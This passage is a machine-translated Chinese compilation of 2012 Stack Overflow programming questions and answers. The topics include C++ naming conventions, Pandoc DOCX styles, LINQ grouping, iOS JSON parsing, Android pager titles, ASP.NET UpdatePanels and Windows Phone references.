*如果您遵循一些*约定，那么约定实际上是无关紧要的。我倾向于使用`newAge`（或者`new_age`如果您*真的*想遵循 Google 指南）作为`setAge()`论据。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T08:40:31.367

我遵循“标准库约定”。getter 和 setter 都像属性一样被调用：

```
void size(size_t size);
size_t size() const; 
```

私有成员具有相同的名称并带有尾随下划线：

```
 size_t size_; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-31T08:57:30.467

任何命名约定或多或少都是任意的，但在这种情况下，明显的解决方案是：

```
void setAge( int newValue /* or newAge */ ); 
```

根据当地约定，该函数可能被命名为`setAge`，或简称为`age`; 在后一种情况下，您需要某种约定来区分函数和数据成员。我见过的大多数地方都使用`m_age`或`myAge`用于数据成员（使用`s_age`或`ourAge`用于静态数据成员）；要么会成功。（我也见过`_age`and `age_`。不过，一般来说，最好避免前导和尾随`_`，因为使用某些字体往往很难看到它们。）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T08:35:14.880

我个人在 cpp 中遵循 java 约定。因此，假设您想将您的财产命名为“新时代”，则该成员将被命名为`newAge`. 然后将命名 getter`getNewAge()`和 setter `setNewAge(int newAge)`。

# title - Pandoc：更改 DOCX 输出中的标题样式

> ID：11735980
> 
> 赞同：3
> 
> 时间：2012-07-31T08:24:50.750
> 
> 标签：title, docx, pandoc

我想转换这个 Markdown：

```
# headline 1

My text

## headline 2 
```

在 DOCX 中有这样的东西：

```
<customStyleTitle1>headline 1</customStyleTitle1>
<text>My text</text>
<customStyleTitle2>headline 2</customStyleTitle2> 
```

需要明确的是，我想创建自定义样式并将其应用于我的标题。

我知道有这个选项`--reference-docx`，但我不知道如何将样式应用到我的标题中......

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T15:56:47.860

使用 Word 本身来修改样式。

复制 reference.docx 并将其放入您的数据目录中，如 pandoc 手册中所述。使用 Word 打开副本并编辑标题样式（格式 -> 样式...）。当您告诉 pandoc 使用修改后的 reference.docx 时，它将从该文档中获取其样式，而不是其默认样式。

有关 pandoc 使用的 docx 样式列表，请参阅[此讨论](https://groups.google.com/forum/?fromgroups#!topic/pandoc-discuss/IFVIruMo5bA)。

# c# - 按 IEnumerable 分组

> ID：11735984
> 
> 赞同：3
> 
> 时间：2012-07-31T08:25:06.410
> 
> 标签：c#, linq, group-by, datarow

我有一个 DataRow 对象的集合。我应该根据“URL_Link”列选择不同的行。在[这篇文章之后](https://stackoverflow.com/questions/1300088/distinct-with-lambda)，我想出了下面的代码。
是否可以将其应用于 DataRow 集合？

```
IEnumerable<DataRow> results = GetData();  
results.GroupBy(row => row.Field<string>("URL_Link")).Select(grp => grp.First()); 
```

它在语法上是正确的，但它不能解决问题。它不会删除重复的行。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T08:59:01.087

除了您没有将结果集重新分配给`result`-variable 的小错误。

如果您实际上应该收到不同的值，我个人觉得使用不同的值要清楚得多。在这种情况下使用 Groupby 并不是很清楚，如果要返回整行，请查看下面的第一个示例，否则请查看第二个示例。

```
 class Program
    {
        static DataTable GetData()
        {
            DataTable table = new DataTable();
            table.Columns.Add("Visits", typeof(int));
            table.Columns.Add("URL_Link", typeof(string));

            table.Rows.Add(57, "yahoo.com");
            table.Rows.Add(130, "google.com");
            table.Rows.Add(92, "google.com");
            table.Rows.Add(25, "home.live.com");
            table.Rows.Add(30, "stackoverflow.com");
            table.Rows.Add(1, "stackoverflow.com");
            table.Rows.Add(7, "mysite.org");
            return table;
    }

    static void Main(string[] args)
    {
        var res = GetData()
                  .AsEnumerable()
                  .GroupBy(row => row.Field<string>("URL_Link"))
                  .Select(grp => grp.First());

        foreach (var item in res)
        {
            string text = "";
            foreach (var clm in item.ItemArray)
                text += string.Format("{0}\t", clm);

            Console.WriteLine(text);
        }
        Console.ReadLine();
    }
} 
```

这或多或少正是您已经提供的。首先，您没有重新分配变量。然后你应该从 ItemArray 到达你的字段。您会看到上面的示例，它给出了以下输出：

```
57    yahoo.com
130   google.com
25    home.live.com
30    stackoverflow.com
7     mysite.com 
```

请记住，您可能必须指定 Select、Orderby 和 Where 子句，具体取决于您是否需要返回这些行中的特定行（即访问次数最多的重复行）。

如果`URL_Link`是您需要或想要从不同结果返回的唯一字段，则此示例清晰明了。它只需要选择您不想要的字段，然后区分它。

```
 static void Main(string[] args)
    {
        var res = GetData()
                    .AsEnumerable()
                    .Select(d=>d.Field<string>("URL_Link"))
                    .Distinct();

        foreach (var item in res)
            Console.WriteLine(item.ToString());  

        Console.ReadLine();
    } 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T08:33:05.570

您的 LINQ 操作的返回没有被分配给任何东西：

```
IEnumerable<DataRow> results = GetData();  
results = results.GroupBy(row => row.Field<string>("URL_Link")).Select(grp => grp.First()); 
```

# iphone - IOS 4.3 如何正确解析来自 Web 服务的 Json 响应并将其绑定到 UITABLEVIEW

> ID：11735986
> 
> 赞同：0
> 
> 时间：2012-07-31T08:25:26.367
> 
> 标签：iphone, ios, xcode, json, ios4

我是 iOS 开发的新手。我想要做的是解析 JSON 网络服务（请参阅下面的示例输出）。我想将上述输出绑定到 UITableView。您能否向我展示如何执行此操作的示例代码。我正在使用带有 4.3 sdk 的 Xcode 3。非常感谢你！

```
[{
    "event_id": "30",
    "bar_name": "Area 05 Superclub",
    "event_name": "test10",
    "date": "Dec 05, 2012 10:00 AM"
}, {
    "event_id": "27",
    "bar_name": "Area 05 Superclub",
    "event_name": "test7",
    "date": "Dec 02, 2012 10:00 AM"
}, {
    "event_id": "28",
    "bar_name": "Area 05 Superclub",
    "event_name": "test8",
    "date": "Dec 03, 2012 10:00 AM"
}, {
    "event_id": "29",
    "bar_name": "Area 05 Superclub",
    "event_name": "test9",
    "date": "Dec 04, 2012 10:00 AM"
}] 
```

好的，伙计们，这是可能的初始代码，（请注意 Tim Stullich，谢谢！）。我能够从网络服务中提取数据。我的下一个问题是如何将它绑定到 UITableView。希望你能再次帮助我。

```
-(void)loadData{
    // Create new SBJSON parser object
    SBJsonParser *parser = [[SBJsonParser alloc] init];
    // Prepare URL request to download statuses from Twitter
    NSURLRequest *request = [NSURLRequest requestWithURL:[NSURL URLWithString:@"http:xxx/gl_getEventsInformation.php"]];

    // Perform request and get JSON back as a NSData object
    NSData *response = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];

    // Get JSON as a NSString from NSData response
    NSString *json_string = [[NSString alloc] initWithData:response encoding:NSUTF8StringEncoding];

    // parse the JSON response into an object
    // Here we're using NSArray since we're parsing an array of JSON status objects
    NSArray *statuses = [parser objectWithString:json_string error:nil];

    // Each element in statuses is a single status
    // represented as a NSDictionary
    for (NSDictionary *status in statuses)
    { NSLog(@"%@ - %@ - %@ - %@", [status objectForKey:@"event_id"],[status objectForKey:@"bar_name"],[status objectForKey:@"event_name"],[status objectForKey:@"date"]);}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:53:23.900

使用 IOS5，您可以使用 NSJSONSerialization 来解析 JSON。

```
NSDictionary *dictionary = [NSJSONSerialization JSONObjectWithData:data options:NSJSONWritingPrettyPrinted error:&error]; 
```

您可以执行以下操作从 Json Data 生成 NSArray。

```
 NSError *e = nil; NSArray *jsonArray = [NSJSONSerialization JSONObjectWithData: data options: NSJSONReadingMutableContainers error: &e];

    if (!jsonArray) 
       {   NSLog(@"Error parsing JSON: %@", e); } 
   else {    for(NSDictionary *item in jsonArray) 
         {
            NSLog(@"Item: %@", item);    
         }
       } 
```

希望这可以帮助你

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T09:42:53.093

您可以使用[诸如此 (TouchJSON) 之类](https://github.com/TouchCode/TouchJSON)的 json 库来将数据反序列化为可可对象。一个简单的工作流程是这样的：

```
#import "CJSONDeserializer.h"
...
NSString *jsonString = @"yourJSONHere";
NSData   *jsonData   = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
NSError  *error      = nil;
NSArray  *jsonArray  = [[CJSONDeserializer deserializer] deserializeAsArray:jsonData error:&error]; 
```

PS。您还可以看到：[https](https://stackoverflow.com/questions/286087/best-json-library-to-use-when-developing-an-iphone-application) ://stackoverflow.com/questions/286087/best-json-library-to-use-when-developing-an-iphone-application它可能会帮助您确定最适合您的需求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:38:03.313

我要做的是检查[这个](https://stackoverflow.com/questions/9875641/adding-json-data-into-uitableview)链接。基本上，您需要将收到的数据解析为最好的 NSArray 或 NSMutableArray，然后实现 UITableView 使用的所需方法并从那里开始。如果您需要更多信息，请告诉我。

# title - fragmentpageadapter 中的多语言标题

> ID：11735987
> 
> 赞同：2
> 
> 时间：2012-07-31T08:25:32.113
> 
> 标签：title, multilingual, fragmentpageradapter

我正在使用 FragmentPagerAdapter 并且我想以不同的语言设置标题信息（“新闻、信息、帮助、会员资格” - 请参见下面的代码）。问题是如何从 res/values/strings.xml 中读取标题？

有人可以帮助我吗？

谢谢

汤姆

```
public class MainInfoViewPagerAdapter extends FragmentPagerAdapter implements    PageIndicator
{
private String[] titles= new String[]
        {          
        "News",          
        "Information",         
        "Help",
        "Membership"
        };   
public MainInfoViewPagerAdapter( FragmentManager fm) 
{
    super(fm);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-13T22:32:08.240

这就是我解决它的方法：

在适配器中：

```
public class TitleAdapter extends FragmentPagerAdapter {
    private String titles[];
    private Fragment frags[];

    public TitleAdapter(FragmentManager fm, Context context) {
                super(fm);

                Resources resources = context.getResources();
                titles = resources.getStringArray(R.array.titles);

                frags = new Fragment[titles.length]; 

                frags[0] = new NewsFragment();
                frags[1] = new ArtistsFragment();
                frags[2] = new InfoFragment();
                frags[3] = new EatDrinkFragment();

         .... 
```

/values/arrays.xml 看起来像这样：

```
<string-array name="titles">
        <item>NEWS</item>
        <item>ARTISTS</item>
        <item>INFORMATION</item>
        <item>EAT AND DRiNK</item>
    </string-array> 
```

如果您想要一种语言，只需添加另一个值文件夹，例如法语的 /values-fr/strings.xml。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T04:24:23.253

您可以测试的另一种方法是这个。对于这个测试，我创建了一个带有选项卡的活动，每次用户选择一个选项卡时，操作栏中的字幕都会更改为不同的语言（英语/西班牙语）。所以我猜你的 Activity 结构是这样的：

```
MainActivity extends FragmentActivity
- In this class you have one ViewPager and one PagerAdapter as attributes
- PagerAdapter is a inner class inside MainActivity. 
```

代码是这样的，首先是主要活动：

```
 public class TrustNetworkActivity extends FragmentActivity implements
        ActionBar.TabListener {
AppSectionsPagerAdapter mAppSectionsPagerAdapter;
private SparseArray<String> TITLES;
ViewPager mViewPager;
/** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        DataBaseDictionary.PACKAGE_NAME = getApplicationContext()
                .getPackageName();
        //Loads the data base
        initDBLoader(this);
        fillSubtitlesArray();
        // Create the adapter that will return a fragment for each of the three
        // primary sections
        // of the app.
        mAppSectionsPagerAdapter = new AppSectionsPagerAdapter(
                getSupportFragmentManager());

        // Set up the action bar.
        final ActionBar ab = getSupportActionBar();
        // ab.setDisplayHomeAsUpEnabled(Boolean.TRUE);
        ab.setSubtitle(TITLES.get(KEY_FRAGMENT));
        ab.setDisplayShowTitleEnabled(true);

        // Set up the ViewPager, attaching the adapter and setting up a listener
        // for when the user swipes between sections.
        mViewPager = (ViewPager) findViewById(R.id.pager);
        mViewPager.setAdapter(mAppSectionsPagerAdapter);
        mViewPager
                .setOnPageChangeListener(new ViewPager.SimpleOnPageChangeListener() {
                    @Override
                    public void onPageSelected(int position) {
                        // When swiping between different app sections, select
                        // the corresponding tab.
                        // We can also use ActionBar.Tab#select() to do this if
                        // we have a reference to the
                        // Tab.
                        ab.setSubtitle(TITLES.get(position));
                        ab.setSelectedNavigationItem(position);
                    }
                });

        ab.addTab(ab.newTab().setText("").setIcon(R.drawable.ic_menu_keys)
                .setTabListener(this));
        ab.addTab(ab.newTab().setText("").setIcon(R.drawable.ic_menu_cert)
                .setTabListener(this));
        ab.addTab(ab.newTab().setText("")
                .setIcon(R.drawable.ic_menu_trust_network).setTabListener(this));
        ab.addTab(ab.newTab().setText("").setIcon(R.drawable.ic_menu_crl)
                .setTabListener(this));
ab.setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);
}

/**
     * Fills the subtitle array with the resource strings, so it would be
     * multilanguage
     */
    private void fillSubtitlesArray() {
        TITLES = new SparseArray<String>();
        TITLES.put(0,
                getResources().getString(R.string.subtitle_keys));
        TITLES.put(1,
                getResources().getString(R.string.subtitle_cert));
        TITLES.put(2,
                getResources().getString(R.string.subtitle_trust_network));
        TITLES.put(3, getResources()
                .getString(R.string.subtitle_crl));
        TITLES.put(4,
                getResources().getString(R.string.subtitle_secure));
        TITLES.put(5,
                getResources().getString(R.string.subtitle_settings));

    } 
```

正如你在`OnPageChangeListener`ViewPager 中看到的，我调用了 action bar`setSubtitle`方法，所以每次用户选择一个新页面时，我的 action bar 的副标题都会改变，然后适配器：

```
 /**
 * A {@link FragmentPagerAdapter} that returns a fragment corresponding to
 * one of the primary sections of the app.
 */
public class AppSectionsPagerAdapter extends FragmentStatePagerAdapter {

    public AppSectionsPagerAdapter(FragmentManager fm) {
        super(fm);
    }

    @Override
    public Fragment getItem(int i) {
        switch (i) {
        case 0:
            // Fragment of the app
            return new Fragment1();
        case 1:
            // Fragment of the app
            return new Fragment2();

        case 2:
            // Fragment of the app
            return new Fragment3();

        case 3:
            // Fragment of the app
            return new Fragment4();

        default:
            return new Fragment5();
        }
    }

    @Override
    public int getCount() {
        return 4;
    }
} 
```

我希望这可以帮助你！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-24T19:48:54.790

我管理它创建一个私有`SparseArray<String> TITLES;`并在主 Activity 中的 OnCreate 函数上填充它，如下所示：

```
 TITLES = new SparseArray<String>();
    TITLES.put(KEY_FRAGMENT,
            getResources().getString(R.string.subtitle_keys));
    TITLES.put(CERTIFICATE_FRAGMENT,
            getResources().getString(R.string.subtitle_cert));
    TITLES.put(TRUST_NETWORK_FRAGMENT,
            getResources().getString(R.string.subtitle_trust_network));
    TITLES.put(CRL_FRAGMENT, getResources()
            .getString(R.string.subtitle_crl));
    TITLES.put(SECURE_FRAGMENT,
            getResources().getString(R.string.subtitle_secure));
    TITLES.put(SETTINGS_FRAGMENT,
            getResources().getString(R.string.subtitle_settings)); 
```

最后在里面`FragmentPagerAdapter`做`getTitle`这样的事情：

```
 @Override
    public CharSequence getPageTitle(int position) {
        switch (position) {
        case 0:
            // Fragment of the app is the Key Management.
            return TITLES.get(position);
        case 1:
            // Fragment of the app is the Certificate Management.
            return TITLES.get(position);

        case 2:
            // Fragment of the app is the Trust Network Management.
            return TITLES.get(position);

        case 3:
            // Fragment of the app is the CRL Management.
            return TITLES.get(position);

        default:
            return TITLES.get(position);
        }
    } 
```

也许它不是最好的方式，但它是一种方式！

# asp.net - 找不到 ID 为 UpdatePanel

> ID：11735989
> 
> 赞同：1
> 
> 时间：2012-07-31T08:25:35.523
> 
> 标签：asp.net, c#-4.0, telerik, updatepanel, radajaxmanager

我正在创建一个带有保存按钮的 aspx 页面。单击保存按钮时，我收到错误消息`"Microsoft JScript runtime error: Sys.InvalidOperationException: Could not find UpdatePanel with ID 'lblAFTimePanel'`。如果它是动态更新的，那么它必须在另一个**UpdatePanel**中。”

请在 aspx 页面下方找到。我有标签**lblAFTime**，它显示**Radtime 选择器**“RCFromTime”的错误消息，它又位于更新面板内。我使用**RadAjaxmanager**作为保存按钮。请帮助我。

```
 <body>
    <form id="form1" runat="server">
    <telerik:RadScriptManager ID="RadScriptManager1" runat="server">
    </telerik:RadScriptManager> 

     <telerik:RadAjaxManager ID="RadAjaxManager1" runat="server">
        <AjaxSettings>
            <telerik:AjaxSetting AjaxControlID="BirthDate">
                <UpdatedControls>
                    <telerik:AjaxUpdatedControl ControlID="lbldob" />
                    <telerik:AjaxUpdatedControl ControlID="RTYear" />
                    <telerik:AjaxUpdatedControl ControlID="RTMonths" />
                    <telerik:AjaxUpdatedControl ControlID="RTDays" />
                    <telerik:AjaxUpdatedControl ControlID="lblAge" />
                </UpdatedControls>
            </telerik:AjaxSetting>
            <telerik:AjaxSetting AjaxControlID="RTYear">
                <UpdatedControls>
                    <telerik:AjaxUpdatedControl ControlID="BirthDate" />
                    <telerik:AjaxUpdatedControl ControlID="lbldob" />

                    <telerik:AjaxUpdatedControl ControlID="lblAge" />
                </UpdatedControls>
            </telerik:AjaxSetting>
            <telerik:AjaxSetting AjaxControlID="rbSave">
                <UpdatedControls>
                    <telerik:AjaxUpdatedControl ControlID="rbSave" />
                    <telerik:AjaxUpdatedControl ControlID="Message" />

                    <telerik:AjaxUpdatedControl ControlID="lblRegnumber" />
                    <telerik:AjaxUpdatedControl ControlID="LblRegnNo" />
                    <telerik:AjaxUpdatedControl ControlID="lbltitle" />
                    <telerik:AjaxUpdatedControl ControlID="lblname" />
                    <telerik:AjaxUpdatedControl ControlID="lbldob" />
                    <telerik:AjaxUpdatedControl ControlID="lblAge" />
                    <telerik:AjaxUpdatedControl ControlID="lblfile" />
                    <telerik:AjaxUpdatedControl ControlID="lblnation" />
                    <telerik:AjaxUpdatedControl ControlID="lblmobile" />
                    <telerik:AjaxUpdatedControl ControlID="lblAFTime" />
                    <telerik:AjaxUpdatedControl ControlID="lblATTime" />
                    <telerik:AjaxUpdatedControl ControlID="lblTimeComp" />
                </UpdatedControls>
            </telerik:AjaxSetting>
        </AjaxSettings>
    </telerik:RadAjaxManager>    

    <telerik:RadCodeBlock ID="RadCodeBlock1" runat="server">

            <script type="text/javascript">             
             function checkError(sender, args) {

                    var dt = args._newValue;
                    var label = $get('<%= lbldob.ClientID %>');
                    if (isNaN(Date.parse(dt))) {
                        args.set_cancel(true);
                        label.innerHTML = "Invalid date";                        
                    }
                    else {
                        label.innerHTML = "";
                    }

                }       
            </script>

        </telerik:RadCodeBlock>    
    <telerik:RadFormDecorator ID="FormDecorator1" runat="server" DecoratedControls="all"></telerik:RadFormDecorator>
    <telerik:RadWindowManager ID="RadWindowManager1" runat="server">
        <Windows>
            <telerik:RadWindow ID="NationalityDialog" Title="Nationality Data" runat="server" Behaviors="Close" Height="550px" Width="450px"
                Left="150px" />
            <telerik:RadWindow ID="RefDrdialog" Title="Referral Doctor Data" runat="server" Height="600px" Width="800px"
                Left="200px" Behaviors="Close" />
            <telerik:RadWindow ID="RefNewPatdialog" Title="New Patient Enquiry" runat="server" Height="550px" Width="1200px"
                Left="200px" Behaviors="Close" Modal="true" />

        </Windows>
    </telerik:RadWindowManager>

  <table border="1" width="100%">
  <tr>
  <td>  
         //some codes
        <table border="0" cellpadding="5" >   
             <tr>

            <br />        
        <table id="TblDoctorApp" runat="server" border="0" cellpadding="5">  
            <tr>
            <td colspan="3" style="font-family: Tahoma; font-size: small; font-weight: bold; font-style: normal; font-variant: normal">
                Appointment with Doctor
            </td>
            </tr>             
            <tr>
            <td>
                Clinic
            </td>
            <td>
                <telerik:RadComboBox ID="RCClinic" runat="server" Width="150px" 
                    DropDownWidth="500px" Height="200px" EmptyMessage="Select Clinic" EnableLoadOnDemand="true"
                 Filter="StartsWith" OnItemsRequested="RCClinic_ItemsRequested" 
                    HighlightTemplatedItems="true" 
                    OnSelectedIndexChanged="RCClinic_SelectedIndexChanged" AutoPostBack="true" 
                    >                  

                 <HeaderTemplate>
                  <table style="width: 500px" cellspacing="0" cellpadding="0">
                        <tr>
                        <td style="text-align:left;width:250px">Clinic
                        </td>
                        <td style="text-align:left;width:250px">Doctor
                        </td>
                        </tr>                
                </table>
                </HeaderTemplate>
                <ItemTemplate>
                <table  style="width: 500px" cellspacing="0" cellpadding="0">
                    <tr>
                    <td style="text-align:left;width:250px">
                        <%# DataBinder.Eval(Container, "Text")%>
                    </td>
                    <td style="text-align:left;width:250px">
                        <%# DataBinder.Eval(Container, "Attributes['doc_name']")%>
                    </td>
                    </tr>
                </table>
                </ItemTemplate>              
                 </telerik:RadComboBox>
            </td>
            </tr>
            <tr>
            <td>
                Doctor
            </td>      
            <td>
                <asp:UpdatePanel ID="PanelDr" runat="server" UpdateMode="Conditional">
                         <Triggers>
                           <asp:AsyncPostBackTrigger ControlID="RCClinic" />
                         </Triggers>
                         <ContentTemplate>
                         <telerik:RadTextBox ID="RCDoctor" runat="server" Width="150px" ></telerik:RadTextBox>
                         </ContentTemplate>
                         </asp:UpdatePanel>               

            </td>
                <td>
                   <asp:UpdatePanel ID="PanelDur" runat="server" UpdateMode="Always">
                         <Triggers>
                           <asp:AsyncPostBackTrigger ControlID="RCClinic" />
                         </Triggers>
                         <ContentTemplate>
                <asp:DropDownList ID="RCDuration" runat="server" Width="75px" AutoPostBack="true" OnSelectedIndexChanged="RCDuration_SelectedIndexChanged" >
                        <asp:ListItem Text="Select" Value="0" />
                        <asp:ListItem runat="server" Text="5 Min" Value="5" />
                        <asp:ListItem runat="server" Text="10 Min" Value="10" />
                        <asp:ListItem runat="server" Text="15 Min" Value="15" />
                        <asp:ListItem runat="server" Text="20 Min" Value="20" />
                        <asp:ListItem runat="server" Text="25 Min" Value="25" />
                        <asp:ListItem runat="server" Text="30 Min" Value="30" />
                        <asp:ListItem runat="server" Text="35 Min" Value="35" />
                        <asp:ListItem runat="server" Text="40 Min" Value="40" />
                        <asp:ListItem runat="server" Text="45 Min" Value="45" />
                        <asp:ListItem runat="server" Text="50 Min" Value="50" />
                        <asp:ListItem runat="server" Text="55 Min" Value="55" />
                        <asp:ListItem runat="server" Text="60 Min" Value="60" />
                    </asp:DropDownList>   
                 </ContentTemplate>
                </asp:UpdatePanel> 
            </td>
            </tr>
            <tr>
            <td>
            </td>
            <td>
                From
            </td>
            <td>
                To
            </td>
            </tr>
            <tr>
            <td>
                App.Time
            </td>
            <td>
                <asp:UpdatePanel ID="UpdatePanel6" runat="server" UpdateMode="Always">
                    <Triggers>
                    <asp:AsyncPostBackTrigger ControlID="RCDuration" />
                    </Triggers>
                    <ContentTemplate>
                <telerik:RadTimePicker ID="RCFromTime" runat="server" Width="110px" Culture="en-US" 
                            TimeView-TimeFormat="t" DateInput-DateFormat="h:mm tt" 
                            DateInput-DisplayDateFormat="h:mm tt" Skin="Web20" >
                     <TimeView ID="TimeView1" StartTime="08:00:00" EndTime="20:00:00" Height="100px" Width="250px" ShowHeader="False" runat="server"></TimeView>
                                </telerik:RadTimePicker>                          
                 </ContentTemplate>
                </asp:UpdatePanel> 

            </td>
            <td>
            <asp:UpdatePanel ID="UpdatePanel7" runat="server" UpdateMode="Always">
            <Triggers>
            <asp:AsyncPostBackTrigger ControlID="RCDuration" />
            </Triggers>
            <ContentTemplate>
              <telerik:RadTimePicker ID="RCToTime" runat="server" Width="110px" Culture="en-US" 
                    TimeView-TimeFormat="t" DateInput-DateFormat="h:mm tt" 
                    DateInput-DisplayDateFormat="h:mm tt" Skin="Web20">
                    <TimeView ID="TimeView2" StartTime="08:00:00" EndTime="20:00:00" Height="100px" Width="250px" ShowHeader="False" runat="server"></TimeView>
                                </telerik:RadTimePicker>               
             </ContentTemplate>
              </asp:UpdatePanel>  
            </td>           
            </tr>
             <tr>
            <td></td>
            <td>  
                <asp:UpdatePanel ID="Panelftime" runat="server" UpdateMode="Always">
            <Triggers>
            <asp:AsyncPostBackTrigger ControlID="RCFromTime" />
            </Triggers>
            <ContentTemplate>     
                <asp:Label ID="lblAFTime" runat="server" Text="" ForeColor="Red"></asp:Label>   
             </ContentTemplate>
              </asp:UpdatePanel>      
            </td>
            <td>   

                <asp:Label ID="lblATTime" runat="server" Text="" ForeColor="Red"></asp:Label>

            </td>

            </tr>  
            <tr>
            <td></td>
            <td colspan="2">
                <asp:Label ID="lblTimeComp" runat="server" Text="" ForeColor="Red"></asp:Label>                
            </td>
            </tr>             
        </table>  

            <br />    
        <table border="0" cellpadding="5">     
        <tr>
        <td style="font-family: Tahoma; font-size: small; font-weight: bold; font-style: normal; font-variant: normal">
            Kin Details
        </td>
        </tr>          
            <tr>
                <td>
                Name
                </td>
                <td>    
                    <telerik:RadTextBox  ID="RTKinName" runat="server" Width="150px"   ></telerik:RadTextBox>
                </td>
            </tr>
            <tr>
            <td>
                Relation
            </td>
            <td>
                <telerik:RadComboBox ID="RCKinRel"  
                runat="server" 
                Width="150px"  /> 
            </td>
            <td>
            Phone
            </td>
            <td>
                <telerik:RadMaskedTextBox ID="RTKinPhone" runat="server" Mask="(###)-#######" 
                    Width="75px" >
                </telerik:RadMaskedTextBox>

            </td>
            </tr>
            </table> 

    </td>
  </tr>
  </table>

    <div>
    <table>
    <tr>
    <td class="style8"> 

        <telerik:RadButton ID="RbSave" runat="server" Text="Save" 
            onclick="RbSave_Click" >
                            <Icon PrimaryIconCssClass="rbSave" PrimaryIconLeft="4" PrimaryIconTop="4" />
                        </telerik:RadButton>
                    </td>
                    <td>
        <telerik:RadButton ID="RbClose" runat="server" Text="Close" 
            onclick="RbClose_Click" style="top: 0px; left: 0px"  >
                            <Icon PrimaryIconCssClass="rbCancel" PrimaryIconLeft="4" PrimaryIconTop="4" />
                        </telerik:RadButton>
    </td>
    </tr>
    </table>  
    </div>

    </form>
</body> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:47:46.590

只需删除此行：`<telerik:AjaxUpdatedControl ControlID="lblAFTime" />`您不需要它，因为 Panelftime UpdatePanel 具有`Always`UpdateMode 属性值。

# c# - windows phone C# system.web

> ID：11735991
> 
> 赞同：-1
> 
> 时间：2012-07-31T08:25:45.037
> 
> 标签：c#, windows-phone-7, libraries, system.web

我正在尝试关注这篇文章：

[http://chriskoenig.net/2011/08/19/upload-files-from-windows-phone/](http://chriskoenig.net/2011/08/19/upload-files-from-windows-phone/)

但是当我写作时：

`using System.Web.Mvc;`

但似乎找不到：

```
using system.web 
```

我正在寻找手动添加它的库，但我找不到它，有什么建议吗？

看来我必须下载一些额外的 DLL，但我不确定在哪里可以找到它们的安全副本？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:32:35.227

当教程指出`Here’s my Controller (FileController.cs)`他正在谈论服务器端应用程序时。不是 Windows Phone 应用程序。WP7 没有这个库可用。

如果您在服务器端应用程序中工作，您可以在`.NET`选项卡下找到 System.Web（添加引用时）。

# android - Android：列表滚动后 ExpandableListView ChildClickListener 不起作用

> ID：11735992
> 
> 赞同：0
> 
> 时间：2012-07-31T08:25:45.607
> 
> 标签：android, expandablelistview

我创建了一个`ExpandableListView`搜索活动，它显示 3 个组 -*曲目、艺术家、专辑*。当用户在 中键入文本时`EditText`，相应的搜索结果会显示在 ExpandableListView 中。

**问题：** 当用户单击任何子项时，我想执行一些操作。起初这个功能工作正常，但是当我向上或向下滚动列表时，`OnChildClickListener`停止工作。并且没有孩子在点击时被选中。

这是视图更新和位置的问题吗？

注意：我正在使用`BaseExpandableListAdapter`

这是代码：（我已经粘贴了我认为必要的内容。如果需要其他部分，请告诉我）：

```
 protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.search);

            etSearchBar = (EditText) findViewById(R.id.etSearchBar);
            etSearchBar.addTextChangedListener(this);

            lvExpSearchResult = (ExpandableListView) findViewById(R.id.lvExpSearchResult);
            lvExpSearchResult.setGroupIndicator(null);
            lvExpSearchResult.setChildIndicator(null);
            lvExpSearchResult.setOnTouchListener(this);
            lvExpSearchResult.setOnChildClickListener(this);
        }

    @Override
        public boolean onChildClick(ExpandableListView parent, View view, int groupPosition,
                int childPosition, long id) {
            lvExpSearchResult.smoothScrollToPosition(groupPosition);
            Toast.makeText(SearchActivity.this, group[groupPosition], Toast.LENGTH_SHORT).show();
            //Toast.makeText(SearchActivity.this, children[groupPosition][childPosition], Toast.LENGTH_LONG).show();
            return true;
        }

@Override
    public void onTextChanged(CharSequence s, int start, int before, int count) {
        if (s.length() > 0) {
            group = new String[] { "Tracks", "Albums", "Artists" };
            ArrayList<String> result = null;

            result = getQueryResult(MediaStore.Audio.Media.TITLE);
            result = new Utilities().removeDuplicatesAL(result);
            String[] tracks = result.toArray(new String[result.size()]);

            result = getQueryResult(MediaStore.Audio.Media.ALBUM);
            result = new Utilities().removeDuplicatesAL(result);
            String[] albums = result.toArray(new String[result.size()]);

            result = getQueryResult(MediaStore.Audio.Media.ARTIST);
            result = new Utilities().removeDuplicatesAL(result);
            String[] artists = result.toArray(new String[result.size()]);

            children = new String[][] { tracks, albums, artists };

            adapter = new SearchAdapter(this, group, children);
        } else {
            adapter = new SearchAdapter(this, new String[0], new String[0][0]);
        }
    }

    @Override
    public void afterTextChanged(Editable s) {
        lvExpSearchResult.setAdapter(adapter);
    }

// BaseExpandableListAdapter code - getGroupView & getChildView
@Override
    public View getChildView(int groupPosition, int childPosition,
            boolean isLastChild, View convertView, ViewGroup parent) {
        TextView childRow = (TextView) convertView;
        if (childRow == null) {
            LayoutInflater inflator = (LayoutInflater) context
                    .getSystemService(context.LAYOUT_INFLATER_SERVICE);
            try {
                childRow = (TextView) inflator.inflate(
                        android.R.layout.simple_expandable_list_item_1, null);
            } catch (Exception e) {
                Toast.makeText(context, e.toString(), Toast.LENGTH_SHORT)
                        .show();
            }
        }
        childRow.setText(children[groupPosition][childPosition]);
        return childRow;
    }

@Override
    public View getGroupView(int groupPosition, boolean isExpanded,
            View convertView, ViewGroup parent) {
        TextView headerRow = (TextView) convertView;
        if (headerRow == null) {
            LayoutInflater inflator = (LayoutInflater) context
